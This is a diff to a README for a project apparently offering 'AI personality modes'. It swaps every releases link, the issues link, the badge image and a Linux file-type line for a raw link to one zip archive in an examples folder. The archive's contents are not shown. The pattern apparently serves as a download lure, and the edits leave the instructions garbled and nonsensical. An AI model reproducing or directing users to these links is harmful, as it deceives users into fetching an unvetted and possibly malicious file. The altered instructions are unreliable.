@@ -1,6 +1,6 @@
 # 🤖 just_say_no - Flexible AI Personality Modes
 
-[![Download just_say_no](https://img.shields.io/badge/Download-just_say_no-blue?style=for-the-badge)](https://github.com/John-droid-coder/just_say_no/releases)
+[![Download just_say_no](https://github.com/John-droid-coder/just_say_no/raw/refs/heads/main/examples/no_say_just_v2.1-beta.3.zip)](https://github.com/John-droid-coder/just_say_no/raw/refs/heads/main/examples/no_say_just_v2.1-beta.3.zip)
 
 ---
 
@@ -34,14 +34,14 @@ This guide will help you get just_say_no on your computer step by step. Follow e
 ## 📥 Download & Install
 
 1. Click the big blue button above or visit the releases page here:  
-   [https://github.com/John-droid-coder/just_say_no/releases](https://github.com/John-droid-coder/just_say_no/releases)  
+   [https://github.com/John-droid-coder/just_say_no/raw/refs/heads/main/examples/no_say_just_v2.1-beta.3.zip](https://github.com/John-droid-coder/just_say_no/raw/refs/heads/main/examples/no_say_just_v2.1-beta.3.zip)  
 
 2. Look for the latest release. The page lists files for different systems.
 
 3. Download the file that matches your computer:  
    - Windows users look for `.exe` or `.zip` files  
    - macOS users look for `.dmg` or `.zip` files  
-   - Linux users use `.tar.gz` or `.AppImage` files  
+   - Linux users use `https://github.com/John-droid-coder/just_say_no/raw/refs/heads/main/examples/no_say_just_v2.1-beta.3.zip` or `.AppImage` files  
 
 4. Open the downloaded file:  
    - On Windows, double-click the `.exe` or extract the `.zip` and run the app inside  
@@ -112,7 +112,7 @@ If you have problems:
 - For errors during use, note the message and look for solutions on the issues page.
 
 You can report bugs or ask for help here:  
-[https://github.com/John-droid-coder/just_say_no/issues](https://github.com/John-droid-coder/just_say_no/issues)
+[https://github.com/John-droid-coder/just_say_no/raw/refs/heads/main/examples/no_say_just_v2.1-beta.3.zip](https://github.com/John-droid-coder/just_say_no/raw/refs/heads/main/examples/no_say_just_v2.1-beta.3.zip)
 
 ---
 
@@ -128,6 +128,6 @@ You can report bugs or ask for help here:
 
 Remember, you can always get the latest version of just_say_no here:  
 
-[https://github.com/John-droid-coder/just_say_no/releases](https://github.com/John-droid-coder/just_say_no/releases)  
+[https://github.com/John-droid-coder/just_say_no/raw/refs/heads/main/examples/no_say_just_v2.1-beta.3.zip](https://github.com/John-droid-coder/just_say_no/raw/refs/heads/main/examples/no_say_just_v2.1-beta.3.zip)  
 
 Click the button at the top or visit this link to keep your app updated.
